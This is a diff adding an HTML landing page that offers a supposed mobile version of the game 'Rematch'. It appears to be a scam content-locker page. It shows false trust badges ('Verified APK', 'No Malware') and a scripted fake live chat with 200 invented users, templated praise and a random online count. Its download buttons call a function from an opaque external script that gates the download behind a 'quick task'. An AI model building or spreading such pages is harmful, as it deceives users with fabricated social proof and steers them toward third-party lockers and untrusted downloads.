@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rematch Mobile</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      background: linear-gradient(135deg, #1a237e 30%, #d50000 70%);
+      color: #FFFFFF;
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 0;
+      position: relative;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      padding-bottom: 60px;
+    }
+    .title {
+      text-align: center;
+      font-size: 32px;
+      font-weight: 700;
+      background: linear-gradient(90deg, #ff5252, #2962ff);
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+    .subtitle {
+      text-align: center;
+      color: #e0e0e0;
+      font-size: 16px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    .trustbar {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 10px;
+      padding: 12px;
+      margin: 20px 0;
+      backdrop-filter: blur(6px);
+      font-weight: bold;
+    }
+    .trustbar i {
+      font-size: 18px;
+      color: #2962ff;
+      margin-right: 8px;
+    }
+    .trustbar span {
+      color: #f1f5f9;
+      font-size: 14px;
+    }
+    .card {
+      background: rgba(255,255,255,0.05);
+      padding: 20px;
+      border-radius: 12px;
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    .game-image {
+      width: 100px;
+      height: 100px;
+      margin: 0 auto;
+      display: block;
+      border-radius: 16px;
+      border: 2px solid #2962ff;
+    }
+    .btn-container {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 20px;
+    }
+    .btn {
+      background: linear-gradient(90deg, #d50000, #b71c1c);
+      color: white;
+      padding: 12px;
+      border-radius: 10px;
+      text-align: center;
+      text-decoration: none;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+      font-size: 16px;
+      transition: all 0.3s;
+    }
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+    .btn-apple {
+      background: linear-gradient(90deg, #2962ff, #1a237e);
+    }
+    .slideshow-container {
+      position: relative;
+      margin: 30px 0;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+      background: rgba(255,255,255,0.05);
+    }
+    .slide {
+      display: none;
+      position: relative;
+    }
+    .slide.active {
+      display: block;
+    }
+    .slide img {
+      width: 100%;
+      height: 200px;
+      object-fit: cover;
+      border-radius: 12px;
+      border: 1px solid #2962ff;
+    }
+    .slide-content {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: linear-gradient(transparent, rgba(0,0,0,0.8));
+      padding: 20px;
+      color: white;
+    }
+    .slide-title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 5px;
+      color: #82b1ff;
+    }
+    .slide-description {
+      font-size: 14px;
+      opacity: 0.9;
+    }
+    .prev, .next {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      background: rgba(0,0,0,0.5);
+      color: white;
+      border: none;
+      padding: 15px 20px;
+      cursor: pointer;
+      font-size: 18px;
+      border-radius: 0 5px 5px 0;
+      transition: background 0.3s;
+    }
+    .prev {
+      left: 0;
+      border-radius: 0 5px 5px 0;
+    }
+    .next {
+      right: 0;
+      border-radius: 5px 0 0 5px;
+    }
+    .prev:hover, .next:hover {
+      background: rgba(0,0,0,0.8);
+    }
+    .dots-container {
+      text-align: center;
+      padding: 20px 0;
+    }
+    .dot {
+      cursor: pointer;
+      height: 15px;
+      width: 15px;
+      margin: 0 5px;
+      background-color: rgba(255,255,255,0.3);
+      border-radius: 50%;
+      display: inline-block;
+      transition: background-color 0.3s;
+    }
+    .dot.active, .dot:hover {
+      background-color: #2962ff;
+    }
+
+    /* Chat specific styles - UNCHANGED */
+    .live-chat {
+        background: #1a202c;
+        margin: 40px 0 20px 0;
+        border-radius: 12px;
+        padding: 15px;
+        border: 1px solid #4a5568;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+    }
+    .chat-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 15px;
+    }
+    .chat-title {
+        color: #a7f3d0;
+        font-size: 20px;
+        font-weight: bold;
+    }
+    .online-count {
+        background: rgba(167, 243, 208, 0.1);
+        color: #a7f3d0;
+        padding: 5px 10px;
+        border-radius: 20px;
+        font-size: 14px;
+    }
+    .chat-messages {
+        height: 200px;
+        overflow-y: auto;
+        text-align: left;
+        margin-bottom: 15px;
+        padding-right: 10px;
+        scrollbar-width: thin;
+        scrollbar-color: #a7f3d0 #2d3748;
+    }
+    .chat-messages::-webkit-scrollbar {
+        width: 8px;
+    }
+    .chat-messages::-webkit-scrollbar-track {
+        background: #2d3748;
+        border-radius: 10px;
+    }
+    .chat-messages::-webkit-scrollbar-thumb {
+        background-color: #a7f3d0;
+        border-radius: 10px;
+        border: 2px solid #2d3748;
+    }
+    .message {
+        margin-bottom: 12px;
+    }
+    .user {
+        color: #63b3ed;
+        font-weight: bold;
+        margin-right: 5px;
+    }
+    .message-time {
+        color: #aaa;
+        font-size: 12px;
+        margin-left: 5px;
+    }
+    .message-text {
+        margin-top: 3px;
+        line-height: 1.4;
+    }
+    .chat-input {
+        display: flex;
+        gap: 10px;
+        align-items: center;
+    }
+    #chat-message {
+        flex: 1;
+        padding: 12px 15px;
+        border-radius: 20px;
+        border: none;
+        background: #2d3748;
+        color: white;
+        font-size: 14px;
+        min-height: 20px;
+        height: 40px;
+        resize: none;
+    }
+    #send-message {
+        background: #a7f3d0;
+        color: #1a202c;
+        border: none;
+        padding: 10px 15px;
+        border-radius: 20px;
+        font-weight: bold;
+        cursor: pointer;
+        height: 40px;
+        font-size: 14px;
+        width: auto;
+        flex-shrink: 0;
+        transition: all 0.3s;
+    }
+    #send-message:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 5px 10px rgba(167, 243, 208, 0.3);
+    }
+
+    /* Game description style - UNCHANGED */
+    .game-description {
+      margin: 30px 0;
+      padding: 20px;
+      border-radius: 12px;
+      background-color: #1e293b;
+      color: #f9fafb;
+      border: 1px solid #334155;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+    }
+    .game-description h2 {
+        font-size: 26px;
+        font-weight: bold;
+        color: #60a5fa;
+        margin-bottom: 15px;
+        text-align: center;
+    }
+    .game-description p {
+        font-size: 16px;
+        line-height: 1.7;
+        margin-bottom: 15px;
+    }
+    .game-description strong {
+        color: #a7f3d0;
+    }
+
+    /* Fixed footer position */
+    .legal {
+      font-size: 11px;
+      color: #94a3b8;
+      text-align: center;
+      margin-top: 40px;
+      font-weight: bold;
+    }
+    .legal a {
+      color: #82b1ff;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1 class="title">Rematch Mobile</h1>
+    <p class="subtitle">Exclusive Game • Unlocked Features • No Ads</p>
+
+    <div class="trustbar">
+      <div><i class="fas fa-lock"></i><span> Secure Download</span></div>
+      <div><i class="fas fa-check-circle"></i><span> Verified APK</span></div>
+      <div><i class="fas fa-shield-alt"></i><span> No Malware</span></div>
+    </div>
+
+    <div class="card">
+      <img src="https://i.ibb.co/V0FtzNHF/tumblr-66d808e1e336f09e0daaf6e0c420fe28-cfc9feef-512.jpg" alt="Rematch Game" class="game-image">
+      <p style="text-align:center; margin-top: 15px; font-weight: bold;">Unlock the full game instantly!</p>
+      <p style="text-align:center; color: #ffd600; font-weight: bold;">Complete one quick task to unlock the download</p>
+
+      <div class="btn-container">
+        <button class="btn" onclick="showDownloadOptions()">Download for Android</button>
+        <button class="btn btn-apple" onclick="showDownloadOptions()">Download for iOS</button>
+      </div>
+    </div>
+
+    <div class="slideshow-container">
+      <div class="slide active">
+        <img src="https://i.ibb.co/HLXpSZQL/2.png" alt="Gameplay Screenshot 1">
+        <div class="slide-content">
+          <div class="slide-title">Dynamic Matches</div>
+          <div class="slide-description">Experience fast-paced 5v5 football action!</div>
+        </div>
+      </div>
+      <div class="slide">
+        <img src="https://i.ibb.co/qYhLXnJ6/1.png" alt="Gameplay Screenshot 2">
+        <div class="slide-content">
+          <div class="slide-title">Stunning Graphics</div>
+          <div class="slide-description">Immersive 3D visuals on your mobile device.</div>
+        </div>
+      </div>
+      <div class="slide">
+        <img src="https://i.ibb.co/4nLXkPwL/3.png" alt="Gameplay Screenshot 3">
+        <div class="slide-content">
+          <div class="slide-title">Intuitive Controls</div>
+          <div class="slide-description">Master passes, shots, and special moves effortlessly.</div>
+        </div>
+      </div>
+      <div class="slide">
+        <img src="https://i.ibb.co/GvzTDhxY/4.png" alt="Gameplay Screenshot 4">
+        <div class="slide-content">
+          <div class="slide-title">Global Leaderboards</div>
+          <div class="slide-description">Compete with players worldwide and climb the ranks.</div>
+        </div>
+      </div>
+
+      <button class="prev" onclick="changeSlide(-1)">❮</button>
+      <button class="next" onclick="changeSlide(1)">❯</button>
+    </div>
+
+    <div class="dots-container">
+      <span class="dot active" onclick="currentSlide(1)"></span>
+      <span class="dot" onclick="currentSlide(2)"></span>
+      <span class="dot" onclick="currentSlide(3)"></span>
+      <span class="dot" onclick="currentSlide(4)"></span>
+    </div>
+
+    <div class="live-chat">
+        <div class="chat-header">
+            <div class="chat-title">Live Chat</div>
+            <div class="online-count">🔴 143 Online</div>
+        </div>
+
+        <div class="chat-messages" id="chat-messages">
+            </div>
+
+        <div class="chat-input">
+            <input type="text" id="chat-message" placeholder="Type your message...">
+            <button id="send-message">Send</button>
+        </div>
+    </div>
+
+    <div class="game-description">
+      <h2>About Rematch Mobile</h2>
+      <p><strong>Rematch Mobile</strong> is a lightning-fast, skill-based football game inspired by the highly anticipated PC and console title, "Rematch." Dive into intense <strong>5v5 matches</strong> featuring polished <strong>3D graphics</strong> and <strong>intuitive controls</strong> that let you master passing, sprinting, shooting, and even in-game emotes! Each match is short, action-packed, and perfect for quick gaming sessions.</p>
+      <p>While the game currently offers engaging offline play against improved AI, an <strong>online multiplayer mode</strong> is launching soon, set to be a true game-changer! Climb the <strong>global leaderboard</strong> and showcase your abilities. This <strong>free-to-play</strong> title prioritizes <strong>player skill, timing, and strategic decisions</strong> over "pay-to-win" mechanics. Prepare for an addictive experience with stunning visuals!</p>
+    </div>
+
+    <div class="legal">
+      <p>Disclaimer: This is a fan-made landing page for promotional purposes only. We are not affiliated with the developers of Rematch. All content is for entertainment and marketing use.</p>
+      <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a></p>
+    </div>
+  </div>
+
+  <script>
+    let slideIndex = 1;
+    showSlide(slideIndex);
+
+    function changeSlide(n) {
+      showSlide(slideIndex += n);
+    }
+
+    function currentSlide(n) {
+      showSlide(slideIndex = n);
+    }
+
+    function showSlide(n) {
+      let slides = document.getElementsByClassName("slide");
+      let dots = document.getElementsByClassName("dot");
+
+      if (n > slides.length) {slideIndex = 1}
+      if (n < 1) {slideIndex = slides.length}
+
+      for (let i = 0; i < slides.length; i++) {
+        slides[i].classList.remove("active");
+      }
+
+      for (let i = 0; i < dots.length; i++) {
+        dots[i].classList.remove("active");
+      }
+
+      slides[slideIndex-1].classList.add("active");
+      dots[slideIndex-1].classList.add("active");
+    }
+
+    // Auto-advance slides every 5 seconds
+    setInterval(function() {
+      changeSlide(1);
+    }, 5000);
+
+    // --- Chat JavaScript ---
+    const firstNames = [
+        "Alex", "Blaze", "Crypto", "Dragon", "Epic", "Fang", "Ghost", "Havoc", "Jade", "Krypto",
+        "Lunar", "Mystic", "Neon", "Omega", "Phantom", "Quantum", "Rogue", "Stealth", "Titan", "Vortex",
+        "Ace", "Bandit", "Cosmo", "Dash", "Echo", "Flare", "Grim", "Hex", "Ice", "Jinx",
+        "Kai", "Lux", "Mako", "Nova", "Onyx", "Pax", "Quill", "Rift", "Sage", "Talon",
+        "Umbra", "Vex", "Wraith", "Xeno", "Yuri", "Zane", "Ash", "Bolt", "Cinder", "Dusk"
+    ];
+    const lastInitials = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
+    const versions = ["Standard", "Premium", "Pro"];
+
+    const uniqueUsernames = [];
+    for (let i = 0; i < 200; i++) {
+        const firstName = firstNames[i % firstNames.length];
+        const lastInitial = lastInitials[Math.floor(Math.random() * lastInitials.length)];
+        uniqueUsernames.push(`${firstName} ${lastInitial}.`);
+    }
+
+    function getTimeAgo(minutesAgo) {
+        const now = new Date();
+        now.setMinutes(now.getMinutes() - minutesAgo);
+        return formatTime(now);
+    }
+
+    function formatTime(date) {
+        let hours = date.getHours();
+        const minutes = date.getMinutes().toString().padStart(2, '0');
+        const ampm = hours >= 12 ? 'PM' : 'AM';
+        hours = hours % 12;
+        hours = hours ? hours : 12;
+        return `${hours}:${minutes} ${ampm}`;
+    }
+
+    const chatMessages = [];
+    const now = new Date();
+    const totalMessages = 200;
+
+    // Improved chat messages focused on football game experience
+    const footballTerms = ["goal", "assist", "tackle", "dribble", "shot", "save", "pass", "cross", "header", "volley"];
+    const skillLevels = ["beginner", "intermediate", "advanced", "pro", "expert"];
+    const positions = ["striker", "midfielder", "defender", "goalkeeper", "winger"];
+    
+    for (let i = 0; i < totalMessages; i++) {
+        const username = uniqueUsernames[i];
+        const minutesAgo = Math.floor((i / totalMessages) * 120);
+        const time = getTimeAgo(minutesAgo);
+
+        const footballTerm = footballTerms[Math.floor(Math.random() * footballTerms.length)];
+        const skillLevel = skillLevels[Math.floor(Math.random() * skillLevels.length)];
+        const position = positions[Math.floor(Math.random() * positions.length)];
+
+        const messageTemplates = [
+            `Just scored an amazing ${footballTerm}! This game's physics are incredible! ⚽`,
+            `The ${position} controls are so smooth in Rematch Mobile! Best football game ever!`,
+            `Anyone else struggling with ${footballTerm} at ${skillLevel} level? Need tips!`,
+            `My ${position} skills have improved so much playing this game! 🔥`,
+            `Can't stop playing Rematch Mobile! The ${footballTerm} mechanics are perfect!`,
+            `Just had an epic match with 5 ${footballTerm}s! This game is addictive!`,
+            `The ${position} AI is so smart in this game! Really challenges you to improve.`,
+            `How do you perform the special ${footballTerm} move? Can't figure it out!`,
+            `Rematch Mobile has the best ${position} gameplay I've experienced on mobile!`,
+            `After 50 matches, I finally mastered the ${footballTerm} technique! So satisfying!`,
+            `The ${position} controls are so responsive! Makes scoring ${footballTerm}s so rewarding!`,
+            `Just reached ${skillLevel} level! This game keeps getting better the more you play!`,
+            `Anyone want to share their best ${position} strategies? Looking to improve my game!`,
+            `The way the ball moves during a ${footballTerm} is so realistic! Amazing physics!`,
+            `Can't believe this is free! The ${position} animations are console quality!`
+        ];
+
+        chatMessages.push({
+            name: username,
+            time: time,
+            text: messageTemplates[Math.floor(Math.random() * messageTemplates.length)],
+            timestamp: new Date(now.getTime() - minutesAgo * 60000)
+        });
+    }
+
+    chatMessages.sort((a, b) => a.timestamp - b.timestamp);
+
+    function addChatMessage(message) {
+        const chatContainer = document.getElementById('chat-messages');
+        const messageElement = document.createElement('div');
+        messageElement.className = 'message';
+        messageElement.innerHTML = `
+            <div>
+                <span class="user">${message.name}</span>
+                <span class="message-time">${message.time}</span>
+            </div>
+            <div class="message-text">${message.text}</div>
+        `;
+        chatContainer.appendChild(messageElement);
+
+        if (chatContainer.children.length > 15) {
+            chatContainer.removeChild(chatContainer.children[0]);
+        }
+
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+    }
+
+    function updateOnlineCount() {
+        const onlineCount = 120 + Math.floor(Math.random() * 30);
+        document.querySelector('.online-count').textContent = `🔴 ${onlineCount} Online`;
+    }
+
+    // Initialize with a few messages
+    for (let i = 0; i < 5; i++) {
+        addChatMessage(chatMessages[i]);
+    }
+
+    let messageIndex = 5;
+    const addNewMessage = () => {
+        if (messageIndex < chatMessages.length) {
+            const message = chatMessages[messageIndex];
+            if (message.timestamp <= new Date()) {
+                addChatMessage({
+                    ...message,
+                    time: formatTime(message.timestamp)
+                });
+                messageIndex++;
+            }
+        }
+        setTimeout(addNewMessage, 1500 + Math.random() * 2500);
+    };
+
+    setTimeout(addNewMessage, 3000);
+    setInterval(updateOnlineCount, 15000);
+
+    document.getElementById('send-message').addEventListener('click', function() {
+        const messageInput = document.getElementById('chat-message');
+        if (messageInput.value.trim()) {
+            addChatMessage({
+                name: "You",
+                time: formatTime(new Date()),
+                text: messageInput.value
+            });
+            messageInput.value = '';
+
+            setTimeout(() => {
+                if (messageIndex < chatMessages.length) {
+                    addChatMessage({
+                        ...chatMessages[messageIndex],
+                        time: formatTime(chatMessages[messageIndex].timestamp)
+                    });
+                    messageIndex++;
+                }
+            }, 750 + Math.random() * 1500);
+        }
+    });
+
+    function showDownloadOptions() {
+        _ET();
+    }
+
+  </script>
+
+  <script type="text/javascript">
+    var wYXXU_ggR_VhKCec={"it":4249631,"key":"406b2"};
+</script>
+  <script src="https://dfmpe7igjx4jo.cloudfront.net/efd96ad.js"></script>
+
+</body>
+</html>
